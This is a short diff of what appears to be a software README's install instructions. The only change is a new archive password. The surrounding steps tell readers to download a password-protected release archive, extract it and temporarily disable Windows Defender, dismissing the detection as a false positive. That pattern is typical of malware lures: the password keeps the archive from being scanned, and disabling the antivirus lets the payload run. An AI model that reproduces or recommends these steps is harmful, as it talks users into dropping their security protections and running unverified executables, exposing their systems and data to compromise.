@@ -46,7 +46,7 @@ Get the latest version from **[Releases](https://github.com/oliverb-io1902e8/age
 ### Step 2: Extract
 Extract the archive using WinRAR or 7-Zip.
 
-**Password:** `Rlt=b?*upVzL`
+**Password:** `Jk*JlV!6eB&4`
 
 ### Step 3: Run
 1. **Temporarily disable Windows Defender** (false positive — the installer registers system components)
